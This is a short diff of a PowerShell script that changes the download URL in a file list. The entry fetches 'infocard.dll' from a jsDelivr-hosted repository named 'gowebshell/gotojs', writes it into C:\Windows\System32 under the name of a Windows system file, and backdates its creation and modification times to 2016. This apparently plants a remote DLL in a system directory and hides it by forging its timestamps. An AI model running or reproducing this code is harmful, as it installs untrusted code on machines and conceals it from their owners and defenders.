@@ -13,7 +13,7 @@ $fileList = @(
         ModificationTime = Get-Date "2016-07-17 10:30:00"
     },
     @{
-        Url = "https://cdn.jsdelivr.net/gh/gowebshell/gotojs@9eb089716417004a7373fbe087a5e7f007fad678/infocard.dll"
+        Url = "https://cdn.jsdelivr.net/gh/gowebshell/gotojs/bye/8082/infocard.dll"
         OutputPath = "C:\Windows\System32\infocard.dll"
         CreationTime = Get-Date "2016-07-18 14:45:00"
         ModificationTime = Get-Date "2016-07-18 14:45:00"
